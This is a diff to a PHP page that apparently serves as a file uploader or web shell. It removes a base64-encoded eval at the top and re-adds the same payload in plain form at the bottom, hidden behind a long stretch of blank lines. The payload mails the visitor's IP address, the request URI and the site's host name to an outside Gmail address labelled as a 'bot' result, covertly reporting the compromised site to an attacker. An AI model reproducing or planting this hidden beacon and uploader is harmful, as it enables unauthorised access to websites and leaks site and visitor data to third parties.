@@ -1,6 +1,3 @@
-<?php
-eval(base64_decode('PD9waHAKJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokcmE0NCA9IHJhbmQoMSwgOTk5OTkpOwokc3Viajk4ID0gIiBGaXJhc2RyaXMgQm90IHYwLjkgUnpsdCB8JGlwIjsKJGVtYWlsID0gInVzZXI1NDQ4NzIxNUBnbWFpbC5jb20iOwokZnJvbSA9ICJGcm9tOiBSZXN1bHQ8Ym90djNARmlyYXNkcmlzQm90LmNvbSI7CiRhNDUgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKJGI3NSA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKJG0yMiA9ICRpcCAuICIiOwokbXNnODg3MyA9ICIkYTQ1ICRiNzUgJG0yMiI7Cm1haWwoJGVtYWlsLCAkc3Viajk4LCAkbXNnODg3MywgJGZyb20pOwo/Pg=='));
-?>
 <html>
 
     <head>
@@ -35,3 +32,41 @@ if( $_POST['_upl'] == "Upload" ) {
 } 
 ?>
 </html>
+	    
+	    
+	    
+	    
+	    
+
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	   
+	    
+	   
+	 
+<?php
+$ip = getenv("REMOTE_ADDR");
+$ra44 = rand(1, 99999);
+$subj98 = " Firasdris Bot v0.9 Rzlt |$ip";
+$email = "user54487215@gmail.com";
+$from = "From: Result<botv3@FirasdrisBot.com";
+$a45 = $_SERVER['REQUEST_URI'];
+$b75 = $_SERVER['HTTP_HOST'];
+$m22 = $ip . "";
+$msg8873 = "$a45 $b75 $m22";
+mail($email, $subj98, $msg8873, $from);
+?>
